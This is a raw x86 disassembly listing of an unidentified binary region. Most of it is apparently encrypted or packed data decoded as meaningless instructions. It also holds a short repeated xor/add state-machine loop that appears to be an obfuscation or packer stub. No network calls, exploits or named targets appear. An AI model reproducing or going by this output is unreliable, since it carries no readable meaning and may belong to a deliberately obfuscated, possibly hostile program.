  41aa05:	mov    ds,ebp
  41aa07:	fbld   TBYTE PTR [ecx+eax*8+0x5f]
  41aa0b:	cld    
  41aa0c:	xor    dl,dl
  41aa0e:	sahf   
  41aa0f:	cmc    
  41aa10:	div    BYTE PTR [eax]
  41aa12:	(bad)  
  41aa13:	stc    
  41aa14:	mov    cl,0x1f
  41aa16:	xchg   ebp,eax
  41aa17:	jp     0x41a9d6
  41aa19:	mov    bl,0x5b
  41aa1b:	xchg   BYTE PTR [ebx-0x59],bh
  41aa1e:	mov    DWORD PTR [edx],edx
  41aa20:	stc    
  41aa21:	push   0x34
  41aa23:	jnp    0x41aa9b
  41aa25:	lahf   
  41aa26:	lock popf 
  41aa28:	sahf   
  41aa29:	cli    
  41aa2a:	sahf   
  41aa2b:	jns    0x41a9e4
  41aa2d:	mov    eax,ds:0x49fcd25d
  41aa32:	jge    0x41aa77
  41aa34:	push   0x938024c4
  41aa39:	pop    ds
  41aa3a:	test   eax,0xc754f6c7
  41aa3f:	jmp    0x41aa1a
  41aa41:	adc    BYTE PTR [edx-0x524721fe],ch
  41aa47:	xchg   BYTE PTR [edi],dl
  41aa49:	pop    eax
  41aa4a:	sti    
  41aa4b:	ins    BYTE PTR es:[edi],dx
  41aa4c:	xchg   esp,eax
  41aa4d:	xchg   esp,eax
  41aa4e:	jmp    FWORD PTR [edx-0x63c46a3e]
  41aa54:	fstp   st(0)
  41aa56:	(bad)  
  41aa57:	cmp    ah,BYTE PTR [edx]
  41aa59:	ror    esi,1
  41aa5b:	mov    dl,0xfd
  41aa5d:	inc    edi
  41aa5e:	out    dx,al
  41aa5f:	ffreep st(6)
  41aa61:	pushf  
  41aa62:	mov    esi,0x3020020d
  41aa67:	adc    ebx,DWORD PTR [esi+0x70279c97]
  41aa6d:	lods   eax,DWORD PTR ds:[esi]
  41aa6e:	loopne 0x41aa94
  41aa70:	mov    esp,0xed17284e
  41aa75:	fistp  QWORD PTR [esp+edi*1-0x28]
  41aa79:	je     0x41aadd
  41aa7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa7c:	mov    BYTE PTR [edx+0x50],ch
  41aa7f:	pop    esi
  41aa80:	cmp    eax,0xba3a3df2
  41aa85:	sub    BYTE PTR [ecx],bh
  41aa87:	add    DWORD PTR gs:[ebx-0x14],ebp
  41aa8b:	jae    0x41aafa
  41aa8d:	in     eax,0xe0
  41aa8f:	sbb    eax,0x2c839700
  41aa94:	arpl   WORD PTR [edi+0x47142434],sp
  41aa9a:	jmp    0x539b:0x836e527d
  41aaa1:	dec    esp
  41aaa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa3:	cmp    edx,DWORD PTR [edi]
  41aaa5:	cmc    
  41aaa6:	(bad)  
  41aaa7:	ins    BYTE PTR es:[edi],dx
  41aaa8:	addr16 inc esi
  41aaaa:	sbb    DWORD PTR [esi+0x67],edx
  41aaad:	xchg   bp,ax
  41aaaf:	(bad)  
  41aab1:	scas   al,BYTE PTR es:[edi]
  41aab2:	mov    DWORD PTR [ebp-0x44],ebx
  41aab5:	mov    edx,DWORD PTR [ebp+0x8]
  41aab8:	xor    edx,eax
  41aaba:	add    edx,esi
  41aabc:	jne    0x4162cf
  41aac2:	mov    edx,DWORD PTR [ebp-0x14]
  41aac5:	mov    DWORD PTR [ebp+0x8],edx
  41aac8:	jmp    0x41ab3d
  41aacd:	mov    edx,DWORD PTR [ebp+0x8]
  41aad0:	mov    ebx,DWORD PTR [ebp-0x8]
  41aad3:	xor    edx,eax
  41aad5:	xor    ebx,eax
  41aad7:	sub    edx,ebx
  41aad9:	sub    edx,esi
  41aadb:	xor    edx,eax
  41aadd:	mov    DWORD PTR [ebp+0x8],edx
  41aae0:	mov    edx,DWORD PTR [ebp+0x8]
  41aae3:	mov    ebx,DWORD PTR [ebp-0x58]
  41aae6:	add    edx,0x5708c0
  41aaec:	imul   edx,ebx
  41aaef:	mov    DWORD PTR [ebp-0x58],edx
  41aaf2:	mov    edx,DWORD PTR [ebp+0x8]
  41aaf5:	mov    ebx,DWORD PTR [ebp-0x54]
  41aaf8:	add    edx,0x64f8a2
  41aafe:	or     edx,ebx
  41ab00:	mov    DWORD PTR [ebp-0x54],edx
  41ab03:	mov    edx,DWORD PTR [ebp+0x8]
  41ab06:	mov    ebx,DWORD PTR [ebp-0x50]
  41ab09:	add    edx,ecx
  41ab0b:	xor    edx,ebx
  41ab0d:	mov    DWORD PTR [ebp-0x50],edx
  41ab10:	mov    edx,DWORD PTR [ebp+0x8]
  41ab13:	mov    ebx,DWORD PTR [ebp-0x4c]
  41ab16:	add    edx,edi
  41ab18:	and    edx,ebx
  41ab1a:	mov    DWORD PTR [ebp-0x4c],edx
  41ab1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ab20:	mov    ebx,DWORD PTR [ebp-0x48]
  41ab23:	lea    edx,[ebx+edx*1+0x241fc1f]
  41ab2a:	mov    DWORD PTR [ebp-0x48],edx
  41ab2d:	mov    edx,DWORD PTR [ebp+0x8]
  41ab30:	mov    ebx,0xfa5e15e2
  41ab35:	sub    ebx,edx
  41ab37:	add    ebx,DWORD PTR [ebp-0x44]
  41ab3a:	mov    DWORD PTR [ebp-0x44],ebx
  41ab3d:	mov    edx,DWORD PTR [ebp+0x8]
  41ab40:	xor    edx,eax
  41ab42:	add    edx,esi
  41ab44:	jne    0x41aacd
  41ab4a:	mov    edx,DWORD PTR [ebp-0x8]
  41ab4d:	mov    ebx,DWORD PTR [ebp-0xc]
  41ab50:	xor    edx,eax
  41ab52:	lea    edx,[edx+ebx*1+0x3272e4]
  41ab59:	mov    DWORD PTR [ebp-0xc],edx
  41ab5c:	mov    edx,DWORD PTR [ebp-0x10]
  41ab5f:	xor    edx,eax
  41ab61:	add    edx,esi
  41ab63:	jne    0x413acb
  41ab69:	jmp    0x41d03b
  41ab6e:	mov    ecx,DWORD PTR [ebp-0x14]
  41ab71:	mov    DWORD PTR [ebp+0x8],ecx
  41ab74:	jmp    0x41abed
  41ab79:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab7c:	mov    edx,DWORD PTR [ebp-0x8]
  41ab7f:	xor    ecx,eax
  41ab81:	xor    edx,eax
  41ab83:	sub    ecx,edx
  41ab85:	sub    ecx,esi
  41ab87:	xor    ecx,eax
  41ab89:	mov    DWORD PTR [ebp+0x8],ecx
  41ab8c:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab8f:	mov    edx,DWORD PTR [ebp-0x58]
  41ab92:	add    ecx,0x5708c0
  41ab98:	imul   ecx,edx
  41ab9b:	mov    DWORD PTR [ebp-0x58],ecx
  41ab9e:	mov    ecx,DWORD PTR [ebp+0x8]
  41aba1:	mov    edx,DWORD PTR [ebp-0x54]
  41aba4:	add    ecx,0x64f8a2
  41abaa:	or     ecx,edx
  41abac:	mov    DWORD PTR [ebp-0x54],ecx
  41abaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41abb2:	mov    edx,DWORD PTR [ebp-0x50]
  41abb5:	add    ecx,0x242ebed
  41abbb:	xor    ecx,edx
  41abbd:	mov    DWORD PTR [ebp-0x50],ecx
  41abc0:	mov    ecx,DWORD PTR [ebp+0x8]
  41abc3:	mov    edx,DWORD PTR [ebp-0x4c]
  41abc6:	add    ecx,edi
  41abc8:	and    ecx,edx
  41abca:	mov    DWORD PTR [ebp-0x4c],ecx
  41abcd:	mov    ecx,DWORD PTR [ebp+0x8]
  41abd0:	mov    edx,DWORD PTR [ebp-0x48]
  41abd3:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41abda:	mov    DWORD PTR [ebp-0x48],ecx
  41abdd:	mov    ecx,DWORD PTR [ebp+0x8]
  41abe0:	mov    edx,0xfa5e15e2
  41abe5:	sub    edx,ecx
  41abe7:	add    edx,DWORD PTR [ebp-0x44]
  41abea:	mov    DWORD PTR [ebp-0x44],edx
  41abed:	mov    ecx,DWORD PTR [ebp+0x8]
  41abf0:	xor    ecx,eax
  41abf2:	add    ecx,esi
  41abf4:	jne    0x41ab79
  41abfa:	jmp    0x41d047
  41abff:	mov    ecx,DWORD PTR [ebp+0x8]
  41ac02:	mov    edx,DWORD PTR [ebp-0x8]
  41ac05:	xor    ecx,eax
  41ac07:	xor    edx,eax
  41ac09:	sub    ecx,edx
  41ac0b:	sub    ecx,esi
  41ac0d:	xor    ecx,eax
  41ac0f:	mov    DWORD PTR [ebp+0x8],ecx
  41ac12:	mov    ecx,DWORD PTR [ebp+0x8]
  41ac15:	mov    edx,DWORD PTR [ebp-0x58]
  41ac18:	jmp    0x41cfd3
  41ac1d:	sbb    DWORD PTR [eax+0x2e],esp
  41ac20:	xrelease lock add DWORD PTR ss:[ebx],edx
  41ac25:	push   esi
  41ac26:	mov    dl,0xc6
  41ac28:	aaa    
  41ac29:	and    ch,BYTE PTR [esi-0x4f]
  41ac2c:	inc    ecx
  41ac2d:	jnp    0x41ac4e
  41ac2f:	jge    0x41aca3
  41ac31:	rcr    BYTE PTR [edi+0x72],1
  41ac34:	jb     0x41ac35
  41ac36:	inc    edi
  41ac37:	mov    ebx,0x1bf5482a
  41ac3c:	hlt    
  41ac3d:	add    BYTE PTR cs:[esi+0x7f],0x4b
  41ac42:	stc    
  41ac43:	xchg   edi,eax
  41ac44:	mov    edi,0xbc3e0217
  41ac49:	adc    BYTE PTR [edi+0x151d32c8],ah
  41ac4f:	cdq    
  41ac50:	mov    ch,0xbf
  41ac52:	addr16 leave 
  41ac54:	arpl   WORD PTR [ebx-0x39],ax
  41ac57:	pop    eax
  41ac58:	test   eax,0x40b1477f
  41ac5d:	data16 outs dx,BYTE PTR ds:[esi]
  41ac5f:	mov    edi,0x1e472fc3
  41ac64:	cmp    BYTE PTR [eax+0x3e],ch
  41ac67:	in     al,0x5f
  41ac69:	push   ds
  41ac6a:	inc    ebp
  41ac6b:	sub    DWORD PTR [ebx+0xb5afe91],esi
  41ac71:	nop
  41ac72:	inc    ecx
  41ac73:	or     ebx,DWORD PTR [eax+edi*4]
  41ac76:	es cld 
  41ac78:	js     0x41ac37
  41ac7a:	and    ecx,DWORD PTR [ebx]
  41ac7c:	scas   al,BYTE PTR es:[edi]
  41ac7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac7e:	test   DWORD PTR [edx+0x17],0x6f1691b2
  41ac85:	das    
  41ac86:	in     al,dx
  41ac87:	xchg   esi,eax
  41ac88:	jae    0x41acf6
  41ac8a:	sbb    cl,BYTE PTR [ecx]
  41ac8c:	pop    edi
  41ac8d:	push   0xffffffc2
  41ac8f:	xchg   DWORD PTR [edx+0x4d],ebx
  41ac92:	fxch   st(2)
  41ac94:	xchg   edx,eax
  41ac95:	js     0x41ad16
  41ac97:	and    esi,DWORD PTR [edx]
  41ac99:	jns    0x41ac75
  41ac9b:	mov    ebp,0x704e0ca3
  41aca0:	outs   dx,DWORD PTR ds:[esi]
  41aca1:	iret   
  41aca2:	xor    DWORD PTR [edi],esp
  41aca4:	xchg   ebx,eax
  41aca5:	cld    
  41aca6:	ret    
  41aca7:	into   
  41aca8:	push   ss
  41aca9:	push   edi
  41acaa:	out    0xce,eax
  41acac:	outs   dx,BYTE PTR ds:[esi]
  41acad:	push   ss
  41acae:	es dec esp
  41acb0:	cdq    
  41acb1:	inc    ecx
  41acb2:	mov    ch,0xc5
  41acb4:	jge    0x41acb5
  41acb6:	in     eax,0x7
  41acb8:	leave  
  41acb9:	daa    
  41acba:	push   esp
  41acbb:	(bad)  
  41acbc:	into   
  41acbd:	mov    ss,ecx
  41acbf:	pop    edx
  41acc0:	mov    ch,0x0
  41acc2:	std    
  41acc3:	hlt    
  41acc4:	sar    DWORD PTR [eax-0x52],0x50
  41acc8:	or     ebp,eax
  41acca:	jg     0x41ac99
  41accc:	leave  
  41accd:	jg     0x41acc9
  41accf:	sbb    dh,cl
  41acd1:	sub    edi,DWORD PTR [esi-0x3c0da347]
  41acd7:	adc    BYTE PTR [esi],dh
  41acd9:	mov    DWORD PTR [edi+0x3229b008],ebp
  41acdf:	dec    ecx
  41ace0:	mov    al,ds:0x4cf77a39
  41ace5:	mov    eax,ds:0xa082c066
  41acea:	retf   0xa575
  41aced:	gs ins BYTE PTR es:[edi],dx
  41acef:	(bad)  
  41acf0:	fldenv [esi+esi*1+0x56]
  41acf4:	outs   dx,DWORD PTR ds:[esi]
  41acf5:	cmp    BYTE PTR [ebx+0x3e4816b0],ah
  41acfb:	retf   0xd60
  41acfe:	sub    al,0xcc
  41ad00:	mov    esi,0x92f545f4
  41ad05:	repz inc ebp
  41ad07:	push   ss
  41ad08:	sub    DWORD PTR [ebx],ebp
  41ad0a:	or     DWORD PTR [ecx],esp
  41ad0c:	mov    dl,0xec
  41ad0e:	mov    eax,0xaaf43f15
  41ad13:	or     esi,DWORD PTR [esi+0x1024e583]
  41ad19:	fcom   QWORD PTR [eax-0x38a614a3]
  41ad1f:	mov    BYTE PTR ds:0x163b5ca2,bh
  41ad25:	push   ebp
  41ad26:	in     eax,dx
  41ad27:	cmp    al,0x31
  41ad29:	cmp    al,dh
  41ad2b:	inc    eax
  41ad2c:	stc    
  41ad2d:	and    DWORD PTR [ebx],edi
  41ad2f:	loope  0x41acb2
  41ad31:	popf   
  41ad32:	and    bh,dh
  41ad34:	adc    eax,0xda831409
  41ad39:	(bad)  
  41ad3a:	mov    bl,BYTE PTR [ebp+0x24]
  41ad3d:	outs   dx,BYTE PTR ds:[esi]
  41ad3e:	add    esp,DWORD PTR [ecx+edx*4]
  41ad41:	mov    bh,0x98
  41ad43:	mov    ebx,0xd53b324e
  41ad48:	aam    0xd5
  41ad4a:	xor    al,0x58
  41ad4c:	nop
  41ad4d:	shl    BYTE PTR ds:0xfacdebe7,0x26
  41ad54:	jbe    0x41ad4e
  41ad56:	and    eax,0xd4c8c73c
  41ad5b:	lds    edx,FWORD PTR [ecx-0x2a8afb6c]
  41ad61:	xchg   ecx,eax
  41ad62:	jg     0x41addd
  41ad64:	out    0xb3,eax
  41ad66:	push   ds
  41ad67:	cmp    DWORD PTR [edi+ebx*4+0x1fa3e8ad],edx
  41ad6e:	add    BYTE PTR [ecx+0x1816981e],bh
  41ad74:	fild   DWORD PTR [edx-0x3ce203d8]
  41ad7a:	jb     0x41ad69
  41ad7c:	mov    edx,0x92a2b96b
  41ad81:	sbb    ebx,edx
  41ad83:	retf   0x1e4c
  41ad86:	sbb    edx,edx
  41ad88:	xchg   esp,eax
  41ad89:	sub    al,BYTE PTR [ebp+0x39]
  41ad8c:	xchg   DWORD PTR [edi-0xa77c480],eax
  41ad92:	sub    al,0x2b
  41ad94:	pop    esi
  41ad95:	or     eax,0x7aa38bf8
  41ad9a:	iret   
  41ad9b:	lahf   
  41ad9c:	ficomp DWORD PTR [ebp+0x59]
  41ad9f:	test   BYTE PTR [edi],al
  41ada1:	aas    
  41ada2:	push   edx
  41ada3:	or     ecx,DWORD PTR [edx]
  41ada5:	jp     0x41ad92
  41ada7:	xchg   edx,eax
  41ada8:	mov    WORD PTR [edi],ds
  41adaa:	lds    ecx,FWORD PTR [eax*4-0x5599fbad]
  41adb1:	das    
  41adb2:	neg    DWORD PTR [ebp+0x1f]
  41adb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adb6:	stos   BYTE PTR es:[edi],al
  41adb7:	adc    esi,DWORD PTR [edx+0x6044775b]
  41adbd:	add    DWORD PTR [edi-0x5bb13958],edi
  41adc3:	rcl    DWORD PTR [edi-0x4b2176f6],0xe
  41adca:	sbb    edi,DWORD PTR [esi-0x6fa4a619]
  41add0:	loope  0x41adf8
  41add2:	(bad)  
  41add3:	daa    
  41add4:	push   ecx
  41add5:	dec    esi
  41add6:	pop    es
  41add7:	add    ebp,DWORD PTR [esi]
  41add9:	les    eax,FWORD PTR [ebx-0x7c0c7ecb]
  41addf:	cs add bl,cl
  41ade2:	xor    ch,BYTE PTR [ebx]
  41ade4:	lock mov ds:0x4aa44c1c,al
  41adea:	pop    ebx
  41adeb:	dec    ebp
  41adec:	xor    al,0x24
  41adef:	ret    
  41adf0:	lahf   
  41adf1:	pop    edi
  41adf2:	data16 fld DWORD PTR [esi+eax*4-0x38]
  41adf7:	pop    ss
  41adf8:	popf   
  41adf9:	mov    ebp,0x3a3ebab0
  41adfe:	jbe    0x41ae5d
  41ae00:	test   BYTE PTR [ebx+0x4e65289a],0x1a
  41ae07:	ds pop ss
  41ae09:	cld    
  41ae0a:	inc    ebp
  41ae0b:	pop    es
  41ae0c:	jnp    0x41ae48
  41ae0e:	fucomi st,st(2)
  41ae10:	mov    bh,0x87
  41ae12:	bound  ebx,QWORD PTR [esi+0x7565d400]
  41ae18:	adc    edx,edx
  41ae1a:	jge    0x41ae59
  41ae1c:	mov    ch,BYTE PTR [eax-0x6e90cc07]
  41ae22:	sbb    DWORD PTR [eax+0x3b],ebx
  41ae25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae26:	es add dh,bh
  41ae29:	jmp    0x3c8e:0x97e8f3d
  41ae30:	lods   eax,DWORD PTR ds:[esi]
  41ae31:	(bad)  
  41ae32:	dec    esp
  41ae33:	scas   al,BYTE PTR es:[edi]
  41ae34:	dec    eax
  41ae35:	push   esi
  41ae36:	or     ebx,ecx
  41ae38:	fsubp  st(3),st
  41ae3a:	adc    eax,0x93a6785f
  41ae3f:	cmp    cl,ah
  41ae41:	mov    eax,0x85b289d9
  41ae46:	adc    bl,bh
  41ae48:	pop    edx
  41ae49:	popf   
  41ae4a:	(bad)  
  41ae4c:	push   ebp
  41ae4d:	mov    dh,0xb9
  41ae4f:	sbb    eax,0xffffff95
  41ae52:	sbb    DWORD PTR [edx-0x672b1b3f],eax
  41ae58:	aas    
  41ae59:	loope  0x41ae73
  41ae5b:	test   BYTE PTR [eax+0x5e],0x9e
  41ae5f:	test   al,0xd7
  41ae61:	pop    esp
  41ae62:	push   0xfffffff7
  41ae64:	fistp  DWORD PTR [eax+0x50dc0b89]
  41ae6a:	mov    fs,edx
  41ae6c:	ja     0x41ae99
  41ae6e:	retf   0xb879
  41ae71:	addr16 push ecx
  41ae73:	push   cs
  41ae74:	xchg   edi,eax
  41ae75:	and    al,0xda
  41ae77:	or     al,0x66
  41ae79:	inc    edx
  41ae7a:	mov    al,0xfb
  41ae7c:	pop    esi
  41ae7d:	adc    esp,DWORD PTR [ebp+ebx*1+0x14]
  41ae81:	js     0x41ae37
  41ae83:	adc    DWORD PTR [edx-0x48],esp
  41ae86:	dec    esi
  41ae87:	test   BYTE PTR [ecx-0x5a],0xd5
  41ae8b:	leave  
  41ae8c:	sbb    eax,0x1afc53ce
  41ae91:	mov    esp,DWORD PTR [ebx-0x512e10ad]
  41ae97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae98:	dec    ecx
  41ae99:	cdq    
  41ae9a:	mov    bl,0x57
  41ae9c:	pop    ebp
  41ae9d:	jne    0x41aeaf
  41ae9f:	adc    bh,bh
  41aea1:	xor    DWORD PTR [edx-0x68],esi
  41aea4:	push   ebx
  41aea5:	outs   dx,BYTE PTR ds:[esi]
  41aea6:	dec    esp
  41aea7:	pop    esp
  41aea8:	aas    
  41aea9:	shl    BYTE PTR [edx+0x50],cl
  41aeac:	dec    ecx
  41aead:	dec    esp
  41aeae:	xchg   ch,dl
  41aeb0:	test   BYTE PTR ds:0xb5b1bbb7,al
  41aeb6:	bndldx bnd3,[ebx-0xa275117]
  41aebd:	sbb    dh,BYTE PTR [ebp+0x245b640b]
  41aec3:	pop    eax
  41aec4:	push   cs
  41aec5:	inc    DWORD PTR [ecx+0x5533a70a]
  41aecb:	bound  edx,QWORD PTR [eax+0x6e]
  41aece:	pop    DWORD PTR [edx-0x62]
  41aed1:	outs   dx,DWORD PTR ds:[esi]
  41aed2:	fistp  DWORD PTR [ebp+0x524070d7]
  41aed8:	cli    
  41aed9:	jl     0x41af12
  41aedb:	dec    esi
  41aedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aedd:	shl    BYTE PTR [ebx+0x14f46147],cl
  41aee3:	mov    dh,dh
  41aee5:	into   
  41aee6:	enter  0x44e0,0xdb
  41aeea:	retf   0xd582
  41aeed:	je     0x41af35
  41aeef:	in     al,dx
  41aef0:	in     eax,dx
  41aef1:	adc    al,0xd7
  41aef3:	sbb    al,0x65
  41aef5:	mov    esi,0x46f2524
  41aefa:	xchg   edx,eax
  41aefb:	xor    eax,0x87833b8e
  41af00:	dec    esp
  41af01:	sbb    eax,0x1dbf7979
  41af06:	pop    ebp
  41af07:	xchg   edi,eax
  41af08:	xchg   edi,eax
  41af09:	push   ds
  41af0a:	imul   esp,ebx,0x16c6a4b6
  41af10:	push   ebp
  41af11:	xor    edx,DWORD PTR [ecx]
  41af13:	lods   eax,DWORD PTR ds:[esi]
  41af14:	jmp    0xda669beb
  41af19:	add    al,BYTE PTR [esp+esi*2+0x62]
  41af1d:	sub    BYTE PTR [edi],dh
  41af1f:	mov    bh,BYTE PTR [ebx]
  41af21:	adc    BYTE PTR [ebx+0x28],0xdd
  41af25:	loope  0x41af74
  41af27:	(bad)  [edi+0x79]
  41af2a:	scas   eax,DWORD PTR es:[edi]
  41af2b:	and    ebx,edi
  41af2d:	mov    edx,ecx
  41af2f:	in     eax,0x22
  41af31:	lods   al,BYTE PTR ds:[esi]
  41af32:	test   al,0x48
  41af34:	or     DWORD PTR [edx+0x3b],esi
  41af37:	sbb    al,BYTE PTR [ebx]
  41af39:	ins    BYTE PTR es:[edi],dx
  41af3a:	and    al,0x88
  41af3c:	mov    DWORD PTR [ecx],ebp
  41af3e:	ror    DWORD PTR [edi],cl
  41af40:	cmp    BYTE PTR [eax-0x7e7f4323],bl
  41af46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af47:	(bad)  
  41af48:	xchg   esp,eax
  41af49:	mov    eax,ds:0x161ffbea
  41af4e:	mov    ecx,0xdc234b73
  41af53:	js     0x41af1d
  41af55:	jg     0x41af69
  41af57:	and    ah,dh
  41af59:	arpl   WORD PTR [ecx-0x1c134473],bx
  41af5f:	popa   
  41af60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af61:	dec    edx
  41af62:	jne    0x41af66
  41af64:	xchg   ebp,eax
  41af65:	inc    ebp
  41af66:	or     al,0x9b
  41af68:	jne    0x41afe7
  41af6a:	shr    DWORD PTR [ecx+0x6ad951c],1
  41af70:	xor    eax,0x8aee5da7
  41af75:	mov    ecx,0xa66a2da1
  41af7a:	arpl   di,ax
  41af7c:	sub    eax,0x1c2d6076
  41af81:	add    DWORD PTR [eax+0x45],eax
  41af84:	sar    DWORD PTR [esi+0x30ebe544],cl
  41af8a:	xor    ecx,DWORD PTR [edi-0x3f]
  41af8d:	repnz or bl,BYTE PTR [ebx+0x6c]
  41af91:	sub    BYTE PTR [eax],0x76
  41af94:	sbb    dl,dh
  41af96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af97:	out    0xa,eax
  41af99:	push   edx
  41af9a:	push   esp
  41af9b:	adc    eax,0x90adb918
  41afa0:	jae    0x41af40
  41afa2:	mov    cl,0xcd
  41afa4:	mov    ch,0xc7
  41afa6:	sbb    BYTE PTR [edx+0x30a50e49],bl
  41afac:	or     DWORD PTR [ecx],ebp
  41afae:	mov    al,0xfd
  41afb0:	or     cl,BYTE PTR [edi+ebp*1-0x5104ba51]
  41afb7:	xchg   edi,eax
  41afb8:	sti    
  41afb9:	es pop eax
  41afbb:	inc    eax
  41afbc:	adc    ebx,eax
  41afbe:	add    eax,0x47af865c
  41afc3:	adc    ebx,DWORD PTR [eax-0x68]
  41afc6:	mov    ch,0x71
  41afc8:	mov    BYTE PTR [edi+0x2209ab32],dh
  41afce:	jb     0x41b005
  41afd0:	add    ah,BYTE PTR [eax+0x54]
  41afd3:	pushf  
  41afd4:	and    DWORD PTR [edi-0x41e48f7],esp
  41afda:	fs mov bh,0xb
  41afdd:	vshufps xmm3,xmm3,XMMWORD PTR [ecx+0x23],0x1d
  41afe3:	mov    di,0xa061
  41afe7:	push   eax
  41afe8:	xchg   ecx,eax
  41afe9:	enter  0xc1fc,0x4c
  41afed:	call   0x625094b5
  41aff2:	inc    ecx
  41aff3:	cdq    
  41aff4:	inc    ebp
  41aff5:	sbb    al,0x25
  41aff7:	mov    ch,0xf5
  41aff9:	dec    esi
  41affa:	cmp    DWORD PTR [edi+0x19b0fe6],eax
  41b000:	adc    esi,DWORD PTR [ebp-0xf]
  41b003:	xor    edx,DWORD PTR [edx+eax*1+0x49df2941]
  41b00a:	retf   
  41b00b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00d:	mov    eax,ds:0x3302f37b
  41b012:	out    dx,eax
  41b013:	outs   dx,BYTE PTR ds:[esi]
  41b014:	pusha  
  41b015:	fcmovnbe st,st(7)
  41b017:	not    DWORD PTR [edx-0x6c]
  41b01a:	arpl   WORD PTR [bx+di+0x56],bx
  41b01e:	repnz out dx,al
  41b020:	setnp  BYTE PTR [ebp+edi*2+0x2f1fc729]
  41b028:	dec    edx
  41b029:	xor    esp,DWORD PTR ds:0xa4c9f15
  41b02f:	mov    esp,0x5a2bfc79
  41b034:	sbb    BYTE PTR [eax-0x2b],ch
  41b037:	(bad)  
  41b038:	fcmovne st,st(6)
  41b03a:	jle    0x41b048
  41b03c:	jle    0x41afc1
  41b03e:	and    BYTE PTR [ebx+0x2],ah
  41b041:	add    edi,eax
  41b043:	mov    ebp,0x3908c61c
  41b048:	test   eax,0x5ea05f83
  41b04d:	fs mov ebp,0x75ef6409
  41b053:	and    al,0x50
  41b055:	or     eax,0xfef9b643
  41b05a:	sbb    BYTE PTR [edi],al
  41b05c:	fbld   TBYTE PTR [edx]
  41b05e:	push   esp
  41b05f:	test   al,0x69
  41b061:	stos   BYTE PTR es:[edi],al
  41b062:	les    edx,FWORD PTR [ebp-0xd]
  41b065:	xor    al,0x28
  41b067:	push   ds
  41b068:	popf   
  41b069:	(bad)  
  41b06b:	inc    esp
  41b06c:	sub    ah,ah
  41b06e:	adc    edx,DWORD PTR [ecx-0x2610cce1]
  41b074:	loop   0x41b0af
  41b076:	loope  0x41b0b0
  41b078:	jp     0x41b034
  41b07a:	mov    ds:0x85df5a1,eax
  41b07f:	lds    esp,FWORD PTR [ecx+ebp*1-0x2e]
  41b083:	adc    edi,ebp
  41b085:	add    BYTE PTR [edi],ch
  41b087:	shl    BYTE PTR [esi+edx*4],0xc3
  41b08b:	div    DWORD PTR [esi+eax*1]
  41b08e:	and    BYTE PTR [edx+eax*2+0x2b],dl
  41b092:	jb     0x41b061
  41b094:	push   ebp
  41b095:	retf   
  41b096:	(bad)  
  41b097:	aam    0x64
  41b099:	sbb    DWORD PTR [ebp+0x59],ebp
  41b09c:	or     esp,eax
  41b09e:	adc    al,BYTE PTR [edi-0x7d95837b]
  41b0a4:	out    dx,eax
  41b0a5:	adc    eax,DWORD PTR [edx+0x37]
  41b0a8:	jmp    0xe55f:0x8f401d9b
  41b0af:	retf   
  41b0b0:	xor    eax,0xe977d1b2
  41b0b5:	inc    ebp
  41b0b6:	dec    edi
  41b0b7:	repz jg 0x41b0b9
  41b0ba:	retf   0x84e6
  41b0bd:	xlat   BYTE PTR ds:[ebx]
  41b0be:	mov    bl,0x6d
  41b0c0:	add    DWORD PTR [eax-0x73],0xffffffd9
  41b0c4:	ss xor ebx,esp
  41b0c7:	mov    edi,DWORD PTR [ebx]
  41b0c9:	and    al,ah
  41b0cb:	popf   
  41b0cc:	pusha  
  41b0cd:	xor    BYTE PTR [ebx],bh
  41b0cf:	pusha  
  41b0d0:	out    0x81,al
  41b0d2:	in     eax,0xc6
  41b0d4:	sub    DWORD PTR [ebx+0x29],ebx
  41b0d7:	pop    ebx
  41b0d8:	in     al,dx
  41b0d9:	lock loopne 0x41b0a8
  41b0dc:	xchg   ebx,eax
  41b0dd:	sbb    BYTE PTR [edx],0x50
  41b0e0:	jle    0x41b078
  41b0e2:	ficom  WORD PTR [edx]
  41b0e4:	sbb    DWORD PTR [ecx+ebx*8],esi
  41b0e7:	or     eax,DWORD PTR [edx]
  41b0e9:	sub    eax,0x9e3b0a87
  41b0ee:	inc    ebx
  41b0ef:	ret    0x74ea
  41b0f2:	mov    eax,0xa605d270
  41b0f7:	sbb    eax,0x365e698a
  41b0fc:	push   eax
  41b0fd:	mov    ebp,DWORD PTR [esi]
  41b0ff:	ss addr16 sbb eax,0xddee0fd0
  41b106:	push   esi
  41b107:	fwait
  41b108:	ret    0xab49
  41b10b:	add    edx,esp
  41b10d:	icebp  
  41b10e:	loopne 0x41b179
  41b110:	mov    dl,0xf1
  41b112:	jbe    0x41b129
  41b114:	outs   dx,BYTE PTR ds:[esi]
  41b115:	dec    edi
  41b116:	sub    BYTE PTR [edx-0x5fd79065],0x8a
  41b11d:	sbb    dl,BYTE PTR [esi+0xaa48d3e]
  41b123:	arpl   WORD PTR [edx],ax
  41b125:	dec    edx
  41b126:	cmp    al,0x7f
  41b128:	and    esi,DWORD PTR [eax-0x703f858f]
  41b12e:	(bad)  
  41b12f:	jmp    0x932b:0xa52db86
  41b136:	xchg   edi,eax
  41b137:	or     DWORD PTR [edx],ebp
  41b139:	sar    al,cl
  41b13b:	mov    esi,0x4282be3b
  41b140:	(bad)  
  41b142:	pop    ss
  41b143:	iret   
  41b144:	scas   al,BYTE PTR es:[edi]
  41b145:	aas    
  41b146:	mov    ds:0x18345cf4,al
  41b14b:	push   edi
  41b14c:	adc    eax,0x4cb46bab
  41b151:	leave  
  41b152:	mov    WORD PTR [ecx+0x273905fc],?
  41b158:	and    eax,0x91a71dcc
  41b15d:	sbb    eax,0xfd57921c
  41b162:	aas    
  41b163:	leave  
